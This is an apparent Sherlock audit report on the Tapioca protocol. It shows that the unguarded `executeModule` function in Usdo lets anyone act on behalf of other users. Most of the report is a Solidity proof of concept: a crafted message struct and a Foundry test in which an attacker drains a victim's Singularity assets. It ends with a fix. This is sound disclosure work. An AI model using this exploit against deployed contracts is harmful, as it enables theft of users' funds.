Future Azure Locust

high

# Unprotected `executeModule` function allows to steal the tokens

## Summary

The `executeModule` function allows anyone to execute any module with any params. That allows attacker to execute operations on behalf of other users.

## Vulnerability Detail

Here is the `executeModule` function:

https://github.com/sherlock-audit/2024-02-tapioca/blob/main/Tapioca-bar/contracts/usdo/Usdo.sol#L152-L159

All its parameters are controlled by the caller and anyone can be the caller. Anyone can execute any module on behalf of any user.

Let's try to steal someone's tokens using `UsdoMarketReceiver` module and `removeAssetReceiver` function (below is the PoC). 

Here is the code that will call the `executeModule` function:

```solidity
bUsdo.executeModule(
    IUsdo.Module.UsdoMarketReceiver, 
    abi.encodeWithSelector(
        UsdoMarketReceiverModule.removeAssetReceiver.selector, 
        marketMsg_), 
    false);
```

The important value here is the `marketMsg_` parameter. The `removeAssetReceiver` function forwards the call to `exitPositionAndRemoveCollateral` function via magnetar contract.

https://github.com/sherlock-audit/2024-02-tapioca/blob/main/Tapioca-bar/gitmodule/tapioca-periph/contracts/Magnetar/modules/MagnetarOptionModule.sol#L150-L165

The `exitPositionAndRemoveCollateral` function removes asset from Singularity market if the `data.removeAndRepayData.removeAssetFromSGL` is `true`. The amount is taken from `data.removeAndRepayData.removeAmount`. Then, if `data.removeAndRepayData.assetWithdrawData.withdraw` is `true`, the `_withdrawToChain` is called.

https://github.com/sherlock-audit/2024-02-tapioca/blob/main/Tapioca-bar/gitmodule/tapioca-periph/contracts/Magnetar/modules/MagnetarOptionModule.sol#L51-L61

In `_withdrawToChain`, if the `data.lzSendParams.sendParam.dstEid` is zero, the `_withdrawHere` is called that transfers asset to `data.lzSendParams.sendParam.to`.

Summing up, the following `marketMsg_` struct can be used to steal `userB`'s assets from singularity market by `userA`. 

```solidity
MarketRemoveAssetMsg({
    user: address(userB),//victim
    externalData: ICommonExternalContracts({
        magnetar: address(magnetar),
        singularity: address(singularity),
        bigBang: address(0),
        marketHelper: address(marketHelper)
    }),
    removeAndRepayData: IRemoveAndRepay({
        removeAssetFromSGL: true,//remove from Singularity market
        removeAmount: tokenAmountSD,//amount to remove
        repayAssetOnBB: false,
        repayAmount: 0,
        removeCollateralFromBB: false,
        collateralAmount: 0,
        exitData: IOptionsExitData({exit: false, target: address(0), oTAPTokenID: 0}),
        unlockData: IOptionsUnlockData({unlock: false, target: address(0), tokenId: 0}),
        assetWithdrawData: MagnetarWithdrawData({
            withdraw: true,//withdraw assets
            yieldBox: address(yieldBox), //where from to withdraw
            assetId: bUsdoYieldBoxId, //what asset to withdraw
            unwrap: false,
            lzSendParams: LZSendParam({
                refundAddress: address(userB),
                fee: MessagingFee({lzTokenFee: 0, nativeFee: 0}),
                extraOptions: "0x",
                sendParam: SendParam({
                    amountLD: 0,
                    composeMsg: "0x",
                    dstEid: 0,
                    extraOptions: "0x",
                    minAmountLD: 0,
                    oftCmd: "0x",
                    to: OFTMsgCodec.addressToBytes32(address(userA)) // recipient of the assets
                })
            }),
            sendGas: 0,
            composeGas: 0,
            sendVal: 0,
            composeVal: 0,
            composeMsg: "0x",
            composeMsgType: 0
        }),
        collateralWithdrawData: MagnetarWithdrawData({
            withdraw: false,
            yieldBox: address(0),
            assetId: 0,
            unwrap: false,
            lzSendParams: LZSendParam({
                refundAddress: address(userB),
                fee: MessagingFee({lzTokenFee: 0, nativeFee: 0}),
                extraOptions: "0x",
                sendParam: SendParam({
                    amountLD: 0,
                    composeMsg: "0x",
                    dstEid: 0,
                    extraOptions: "0x",
                    minAmountLD: 0,
                    oftCmd: "0x",
                    to: OFTMsgCodec.addressToBytes32(address(userB))
                })
            }),
            sendGas: 0,
            composeGas: 0,
            sendVal: 0,
            composeVal: 0,
            composeMsg: "0x",
            composeMsgType: 0
        })
    })
});
```

Here is the modified version of the `test_market_remove_asset` test that achieves the same result, but with unauthorized call to `executeModule` function. The `userA` is the attacker, and `userB` is the victim.

```solidity
    function test_malicious_market_remove_asset() public {
        uint256 erc20Amount_ = 1 ether;

        // setup
        {
            deal(address(bUsdo), address(userB), erc20Amount_);

            vm.startPrank(userB);
            bUsdo.approve(address(yieldBox), type(uint256).max);
            yieldBox.depositAsset(bUsdoYieldBoxId, address(userB), address(userB), erc20Amount_, 0);

            uint256 sh = yieldBox.toShare(bUsdoYieldBoxId, erc20Amount_, false);
            yieldBox.setApprovalForAll(address(pearlmit), true);
            pearlmit.approve(
                address(yieldBox), bUsdoYieldBoxId, address(singularity), uint200(sh), uint48(block.timestamp + 1)
            );
            singularity.addAsset(address(userB), address(userB), false, sh);
            vm.stopPrank();
        }

        uint256 tokenAmount_ = 0.5 ether;

        /**
         * Actions
         */
        uint256 tokenAmountSD = usdoHelper.toSD(tokenAmount_, aUsdo.decimalConversionRate());

        //approve magnetar
        vm.startPrank(userB);
        bUsdo.approve(address(magnetar), type(uint256).max);
        singularity.approve(address(magnetar), type(uint256).max);
        vm.stopPrank();
        
        MarketRemoveAssetMsg memory marketMsg = MarketRemoveAssetMsg({
            user: address(userB),
            externalData: ICommonExternalContracts({
                magnetar: address(magnetar),
                singularity: address(singularity),
                bigBang: address(0),
                marketHelper: address(marketHelper)
            }),
            removeAndRepayData: IRemoveAndRepay({
                removeAssetFromSGL: true,
                removeAmount: tokenAmountSD,
                repayAssetOnBB: false,
                repayAmount: 0,
                removeCollateralFromBB: false,
                collateralAmount: 0,
                exitData: IOptionsExitData({exit: false, target: address(0), oTAPTokenID: 0}),
                unlockData: IOptionsUnlockData({unlock: false, target: address(0), tokenId: 0}),
                assetWithdrawData: MagnetarWithdrawData({
                    withdraw: true,
                    yieldBox: address(yieldBox),
                    assetId: bUsdoYieldBoxId,
                    unwrap: false,
                    lzSendParams: LZSendParam({
                        refundAddress: address(userB),
                        fee: MessagingFee({lzTokenFee: 0, nativeFee: 0}),
                        extraOptions: "0x",
                        sendParam: SendParam({
                            amountLD: 0,
                            composeMsg: "0x",
                            dstEid: 0,
                            extraOptions: "0x",
                            minAmountLD: 0,
                            oftCmd: "0x",
                            to: OFTMsgCodec.addressToBytes32(address(userA)) // transfer to attacker
                        })
                    }),
                    sendGas: 0,
                    composeGas: 0,
                    sendVal: 0,
                    composeVal: 0,
                    composeMsg: "0x",
                    composeMsgType: 0
                }),
                collateralWithdrawData: MagnetarWithdrawData({
                    withdraw: false,
                    yieldBox: address(0),
                    assetId: 0,
                    unwrap: false,
                    lzSendParams: LZSendParam({
                        refundAddress: address(userB),
                        fee: MessagingFee({lzTokenFee: 0, nativeFee: 0}),
                        extraOptions: "0x",
                        sendParam: SendParam({
                            amountLD: 0,
                            composeMsg: "0x",
                            dstEid: 0,
                            extraOptions: "0x",
                            minAmountLD: 0,
                            oftCmd: "0x",
                            to: OFTMsgCodec.addressToBytes32(address(userB))
                        })
                    }),
                    sendGas: 0,
                    composeGas: 0,
                    sendVal: 0,
                    composeVal: 0,
                    composeMsg: "0x",
                    composeMsgType: 0
                })
            })
        });
        bytes memory marketMsg_ = usdoHelper.buildMarketRemoveAssetMsg(marketMsg);


        // I added _checkSender in MagnetarMock (function exitPositionAndRemoveCollateral) so need to whitelist USDO
        cluster.updateContract(aEid, address(bUsdo), true);

        // ----- ADDED THIS ------>
        // Attack using executeModule
        // ------------------------
        vm.startPrank(userA);
        bUsdo.executeModule(
            IUsdo.Module.UsdoMarketReceiver, 
            abi.encodeWithSelector(
                UsdoMarketReceiverModule.removeAssetReceiver.selector, 
                marketMsg_), 
            false);
        // ------------------------

        // Check execution
        {
            assertEq(bUsdo.balanceOf(address(userB)), 0);
            assertEq(
                yieldBox.toAmount(bUsdoYieldBoxId, yieldBox.balanceOf(address(userB), bUsdoYieldBoxId), false),
                0
            );
            assertEq(bUsdo.balanceOf(address(userA)), tokenAmount_);
        }
    }
```

**Note:** The `burst` function was modified in the MagnetarMock contract and add call to `_checkSender` function to reproduce the real situation.

https://github.com/sherlock-audit/2024-02-tapioca/blob/main/Tapioca-bar/test/MagnetarMock.sol#L62-L67

That is also why the `bUsdo` has been whitelisted in the test. 

## Impact

HIGH - Anyone can steal others' tokens from their markets.

## Code Snippet

https://github.com/sherlock-audit/2024-02-tapioca/blob/main/Tapioca-bar/contracts/usdo/Usdo.sol#L152-L159

https://github.com/sherlock-audit/2024-02-tapioca/blob/main/TapiocaZ/contracts/tOFT/mTOFT.sol#L198-L205

https://github.com/sherlock-audit/2024-02-tapioca/blob/main/TapiocaZ/contracts/tOFT/TOFT.sol#L146-L153

## Tool used

Manual Review

## Recommendation

The `executeModule` function should inspect and validate the `_data` parameter to make sure that the caller is the same address as the user who executes the operations.